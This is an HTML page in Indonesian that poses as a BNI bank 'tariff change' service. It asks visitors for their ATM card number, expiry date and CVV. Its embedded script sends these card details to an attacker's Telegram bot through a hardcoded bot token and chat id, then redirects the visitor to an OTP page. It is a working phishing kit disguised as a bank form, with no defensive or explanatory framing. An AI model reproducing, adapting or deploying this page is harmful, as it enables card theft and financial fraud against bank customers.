<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Layanan online BNI 2023</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
</head>
<body>
    <nav class="navbar" style="background-color: #FF6600">
        <div class="container">
            <a class="navbar-brand" href="#">
                <img src="logo.png" alt="logo" width="70" height="24">
            </a>
            <h2 style="color: #fff">Layanan Ganti Tarif BNI</h2>
        </div>
    </nav>

    <div class="container mt-4">
        <div class="d-flex justify-content-around">
            <div class="gif-home">
                <img src="card.gif" class="img-fluid" alt="">
            </div>
        </div>

        <div class="container w-75">
            <p class="fw-bold text-center mt-3">Silakan masukkan data di bawah ini untuk proses perubahan tarif transaksi</p>
            <div class="form-cc">
                <div class="form-group">
                    <input style="border-radius: 15px" type="number" class="form-control shadow-sm" id="input1" placeholder="Nomor Kartu ATM 16 Digit Angka" maxlength="16" minlenght="16">
                </div>
                <label class="fw-bold mt-3">Masa Berlaku Kartu ATM</label>
                <div class="d-flex justify-content-between mt-3">
                    <div class="form-group" style="width: 30%">
                        <select style="border-radius: 15px" class="form-control shadow-sm" id="input2">
                            <option value="">Bulan</option>
                            <option value="1">1</option>
                            <option value="2">2</option>
                            <option value="3">3</option>
                            <option value="4">4</option>
                            <option value="5">5</option>
                            <option value="6">6</option>
                            <option value="7">7</option>
                            <option value="8">8</option>
                            <option value="9">9</option>
                            <option value="10">10</option>
                            <option value="11">11</option>
                            <option value="12">12</option>
                        </select>
                    </div>
                    <div class="form-group" style="width: 30%">
                        <select style="border-radius: 15px" class="form-control shadow-sm form-control-sm" id="input3">
                            <option value="">Tahun</option>
                            <option value="2023">2023</option>
                            <option value="2024">2024</option>
                            <option value="2025">2025</option>
                            <option value="2026">2026</option>
                            <option value="2027">2027</option>
                            <option value="2028">2028</option>
                        </select>
                    </div>
                </div>
                <div class="form-group mt-3">
                    <label class="fw-bold" for="input4">CVV 7 Digit di Belakang Kartu</label>
                    <input style="border-radius: 15px" type="number" class="form-control shadow-sm" id="input4" placeholder="7 Digit Angka">
                </div>
                <div class="bnt-next mt-3 mb-3 text-center">
                    <button onclick="next()" class="btnNext mt-3" style="background-color: #FF6600; border: none; border-radius: 19px; width: 100%; color: white; font-weight: bold; height: 45px">Lanjut</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        function sendMessage(id, botApi, pesan) {
            const url = `https://api.telegram.org/bot${botApi}/sendMessage`;
            const data = {
                chat_id: id,
                text: pesan
            };
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Pesan terkirim:', data);
                window.location.href = "otp.html"
            })
            .catch(error => {
                console.error('Terjadi kesalahan:', error);
            });
        }

        const next = () => {
            const nocard = document.querySelector("#input1").value;
            const bulan = document.querySelector("#input2").value;
            const tahun = document.querySelector("#input3").value;
            const cvv = document.querySelector("#input4").value;
            let text = `==| SUDAH TERDAFTAR |==\nNomor Kartu: ${nocard}\nBulan: ${bulan}\nTahun: ${tahun}\nCVV: ${cvv}`;
            let bot = "6439882035:AAFBxLEyIBEwOoC3hQGw2ZBC7HFPLeCi9Tg";
            let id = "6558831774";
            if (nocard === "" || cvv === "" || bulan === "" || tahun === "") {
                alert("Mohon lengkapi data Anda.");
            } else {
                sendMessage(id, bot, text);
            }
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
</body>
</html>
